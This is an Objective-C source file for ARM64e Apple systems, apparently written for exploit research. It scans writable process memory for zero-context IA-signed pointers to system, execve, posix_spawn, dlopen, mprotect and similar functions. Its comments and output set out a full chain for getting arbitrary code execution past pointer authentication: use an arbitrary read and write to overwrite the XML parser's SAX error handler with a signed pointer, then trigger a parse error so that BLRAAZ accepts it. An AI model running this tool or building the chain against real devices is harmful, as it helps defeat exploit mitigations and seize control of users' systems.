/*
 * blraaz_probe.m — Scan writable memory for IA-zero-signed pointers
 * to dangerous functions (system, execve, posix_spawn, dlopen, mprotect, etc.)
 *
 * On ARM64e, BLRAAZ verifies: auth(ptr, IA, 0) == stripped(ptr).
 * If we find a validly IA-zero-signed pointer to system() in writable memory,
 * we can read it (arbitrary read) and write it to a BLRAAZ dispatch target
 * (arbitrary write) to achieve ACE.
 *
 * Build: clang -fobjc-arc -framework Foundation -framework Security
 *        -framework CoreFoundation -F/System/Library/PrivateFrameworks
 *        -o blraaz_probe blraaz_probe.m
 */
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <mach-o/dyld.h>
#import <mach-o/loader.h>
#import <mach/mach.h>
#import <mach/vm_map.h>
#import <signal.h>
#import <setjmp.h>
#import <stdio.h>
#import <string.h>
#import <ptrauth.h>

/* Signal handler for PAC auth faults */
static sigjmp_buf g_jmpbuf;
static volatile sig_atomic_t g_faulted = 0;

static void pac_fault_handler(int sig) {
    g_faulted = 1;
    siglongjmp(g_jmpbuf, 1);
}

/* Test if a value is validly IA-zero-signed.
 * autia(value, 0) will set error bits if the PAC doesn't match.
 * We compare the result with xpaci(value) — if they match, the PAC is valid. */
static int test_ia_zero_signed(uint64_t value) {
    uint64_t authed = 0;
    uint64_t stripped = 0;

    /* Strip PAC bits to get the bare pointer */
    stripped = (uint64_t)ptrauth_strip((void *)value, ptrauth_key_asia);

    /* If stripped pointer is not in code range, skip */
    if (stripped < 0x100000000ULL || stripped > 0x300000000ULL)
        return 0;

    /* Try autia with zero context using inline asm */
    g_faulted = 0;
    struct sigaction sa = {0}, old_bus = {0}, old_segv = {0}, old_trap = {0};
    sa.sa_handler = pac_fault_handler;
    sa.sa_flags = 0;
    sigaction(SIGBUS, &sa, &old_bus);
    sigaction(SIGSEGV, &sa, &old_segv);
    sigaction(SIGTRAP, &sa, &old_trap);

    if (sigsetjmp(g_jmpbuf, 1) == 0) {
        __asm__ volatile(
            "mov x17, xzr\n"
            "mov x16, %[val]\n"
            "autia x16, x17\n"
            "mov %[out], x16\n"
            : [out] "=r" (authed)
            : [val] "r" (value)
            : "x16", "x17"
        );
    }

    sigaction(SIGBUS, &old_bus, NULL);
    sigaction(SIGSEGV, &old_segv, NULL);
    sigaction(SIGTRAP, &old_trap, NULL);

    if (g_faulted)
        return 0;

    /* autia succeeded. Check if result matches stripped pointer.
     * If authed == stripped, the PAC was valid for IA with zero context. */
    return (authed == stripped) ? 1 : 0;
}

/* Dangerous functions to look for */
typedef struct {
    const char *name;
    void *addr;
} target_func_t;

static target_func_t g_targets[32];
static int g_ntargets = 0;

static void add_target(const char *name) {
    void *addr = dlsym(RTLD_DEFAULT, name);
    if (addr) {
        g_targets[g_ntargets].name = name;
        g_targets[g_ntargets].addr = addr;
        g_ntargets++;
        printf("  Target: %-30s %p (stripped: %p)\n",
               name, addr, ptrauth_strip(addr, ptrauth_key_asia));
    }
}

/* Check if a stripped pointer matches any target function */
static const char *match_target(uint64_t stripped) {
    for (int i = 0; i < g_ntargets; i++) {
        uint64_t target_stripped = (uint64_t)ptrauth_strip(
            g_targets[i].addr, ptrauth_key_asia);
        if (stripped == target_stripped)
            return g_targets[i].name;
    }
    return NULL;
}

/* Scan a memory region for IA-zero-signed pointers to targets */
static int scan_region(vm_address_t start, vm_size_t size, const char *label,
                       int check_auth) {
    int hits = 0;
    uint64_t *ptr = (uint64_t *)start;
    size_t count = size / sizeof(uint64_t);

    for (size_t i = 0; i < count; i++) {
        uint64_t val = ptr[i];
        if (val == 0) continue;

        /* Strip PAC bits */
        uint64_t stripped = (uint64_t)ptrauth_strip((void *)val, ptrauth_key_asia);

        /* Quick check: does it match a target function? */
        const char *match = match_target(stripped);
        if (!match) continue;

        /* Potential hit — verify IA-zero signature if requested */
        int ia_zero_valid = 0;
        if (check_auth) {
            ia_zero_valid = test_ia_zero_signed(val);
        }

        printf("\n  *** HIT: %s ***\n", match);
        printf("    Address in memory:  %p (offset +0x%lx in %s)\n",
               &ptr[i], (unsigned long)(i * 8), label);
        printf("    Raw value (w/PAC): 0x%016llx\n", (unsigned long long)val);
        printf("    Stripped:          0x%016llx\n", (unsigned long long)stripped);
        if (check_auth) {
            printf("    IA-zero-signed:    %s\n",
                   ia_zero_valid ? "YES *** BLRAAZ WILL ACCEPT ***" : "NO");
        }

        /* Also resolve via dladdr for confirmation */
        Dl_info dli;
        if (dladdr((void *)stripped, &dli)) {
            printf("    dladdr: %s in %s\n",
                   dli.dli_sname ? dli.dli_sname : "?",
                   dli.dli_fname ? dli.dli_fname : "?");
        }

        hits++;
    }
    return hits;
}

int main(void) {
    @autoreleasepool {
        printf("=== BLRAAZ Zero-Context Pointer Scan ===\n\n");
        printf("Scanning writable memory for IA-zero-signed pointers to dangerous functions.\n");
        printf("If found: arbitrary read + write → overwrite SAX handler → BLRAAZ → ACE.\n\n");

        /* Load libraries that might be in the exploit process */
        dlopen("/System/Library/Frameworks/Security.framework/Security", RTLD_NOW);
        dlopen("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", RTLD_NOW);
        dlopen("/System/Library/PrivateFrameworks/GraphicsServices.framework/GraphicsServices", RTLD_NOW);

        /* Register target functions */
        printf("Registering dangerous function targets:\n");
        add_target("system");
        add_target("execve");
        add_target("posix_spawn");
        add_target("posix_spawnp");
        add_target("dlopen");
        add_target("dlsym");
        add_target("mprotect");
        add_target("mmap");
        add_target("objc_msgSend");
        add_target("popen");
        add_target("execl");
        add_target("execvp");
        add_target("fork");
        add_target("vfork");
        printf("  Total targets: %d\n\n", g_ntargets);

        /* Phase 1: Scan Mach-O writable sections (__DATA, __DATA_DIRTY, __AUTH) */
        printf("=== Phase 1: Mach-O writable sections ===\n");
        int total_hits = 0;

        for (uint32_t img = 0; img < _dyld_image_count(); img++) {
            const struct mach_header_64 *mh =
                (const struct mach_header_64 *)_dyld_get_image_header(img);
            const char *name = _dyld_get_image_name(img);
            intptr_t slide = _dyld_get_image_vmaddr_slide(img);
            if (!mh || mh->magic != MH_MAGIC_64) continue;

            const char *short_name = strrchr(name, '/');
            short_name = short_name ? short_name + 1 : name;

            const uint8_t *ptr = (const uint8_t *)(mh + 1);
            for (uint32_t c = 0; c < mh->ncmds; c++) {
                const struct load_command *lc = (void *)ptr;
                if (lc->cmd == LC_SEGMENT_64) {
                    const struct segment_command_64 *seg = (void *)ptr;

                    /* Only scan writable segments */
                    if (!(seg->initprot & VM_PROT_WRITE)) {
                        ptr += lc->cmdsize;
                        continue;
                    }

                    /* Skip __LINKEDIT and zero-size */
                    if (seg->vmsize == 0 || strcmp(seg->segname, "__LINKEDIT") == 0) {
                        ptr += lc->cmdsize;
                        continue;
                    }

                    char label[128];
                    snprintf(label, sizeof(label), "%s:%s", short_name, seg->segname);

                    vm_address_t addr = (vm_address_t)(seg->vmaddr + slide);

                    /* Verify the region is actually readable */
                    vm_address_t raddr = addr;
                    vm_size_t rsize = 0;
                    vm_region_basic_info_data_64_t info;
                    mach_msg_type_number_t count = VM_REGION_BASIC_INFO_COUNT_64;
                    mach_port_t obj;
                    kern_return_t kr = vm_region_64(mach_task_self(), &raddr, &rsize,
                        VM_REGION_BASIC_INFO_64, (vm_region_info_t)&info, &count, &obj);

                    if (kr != KERN_SUCCESS || !(info.protection & VM_PROT_READ))  {
                        ptr += lc->cmdsize;
                        continue;
                    }

                    int writable = (info.protection & VM_PROT_WRITE) != 0;
                    printf("  Scanning %-45s %p (0x%llx bytes) %s\n",
                           label, (void *)addr, (unsigned long long)seg->vmsize,
                           writable ? "[RW]" : "[RO-runtime]");

                    int hits = scan_region(addr, (vm_size_t)seg->vmsize, label, 1);
                    total_hits += hits;
                }
                ptr += lc->cmdsize;
            }
        }

        /* Phase 2: Scan ALL writable VM regions (catches heap, stack, mmap'd) */
        printf("\n=== Phase 2: All writable VM regions ===\n");

        vm_address_t addr = 0;
        vm_size_t size = 0;
        int regions_scanned = 0;
        uint64_t bytes_scanned = 0;

        while (1) {
            vm_region_basic_info_data_64_t info;
            mach_msg_type_number_t count = VM_REGION_BASIC_INFO_COUNT_64;
            mach_port_t obj;

            kern_return_t kr = vm_region_64(mach_task_self(), &addr, &size,
                VM_REGION_BASIC_INFO_64, (vm_region_info_t)&info, &count, &obj);
            if (kr != KERN_SUCCESS) break;

            /* Only scan readable + writable regions */
            if ((info.protection & (VM_PROT_READ | VM_PROT_WRITE)) ==
                (VM_PROT_READ | VM_PROT_WRITE)) {

                /* Skip very large regions (>64MB) to avoid timeout */
                if (size <= 64 * 1024 * 1024) {
                    char label[64];
                    snprintf(label, sizeof(label), "vm@%p", (void *)addr);
                    /* Phase 2: no auth test (too slow for full VM), just match */
                    int hits = scan_region(addr, size, label, 0);
                    if (hits > 0) {
                        /* Auth-test only the hits found */
                        printf("  Re-scanning with auth test...\n");
                        scan_region(addr, size, label, 1);
                    }
                    total_hits += hits;
                    regions_scanned++;
                    bytes_scanned += size;
                }
            }

            addr += size;
            if (addr == 0) break; /* overflow */
        }

        printf("\n  VM scan: %d regions, %llu MB scanned\n",
               regions_scanned, (unsigned long long)(bytes_scanned / (1024*1024)));

        /* Summary */
        printf("\n");
        printf("============================================================\n");
        printf("  RESULTS\n");
        printf("============================================================\n");
        printf("  Total IA-zero-signed dangerous function pointers: %d\n", total_hits);
        if (total_hits > 0) {
            printf("  *** ACE IS POSSIBLE via BLRAAZ substitution ***\n");
            printf("  Chain: arbitrary read → copy signed ptr → arbitrary write\n");
            printf("  → overwrite ctxt->sax->error → trigger parse error\n");
            printf("  → ___xmlRaiseError → blraaz → PAC check PASSES → ACE\n");
        } else {
            printf("  No IA-zero-signed pointers to dangerous functions found.\n");
            printf("  ACE via BLRAAZ substitution is NOT possible.\n");
            printf("  Arbitrary read + write remains the ceiling on ARM64e.\n");
        }
        printf("============================================================\n");
    }
    return 0;
}
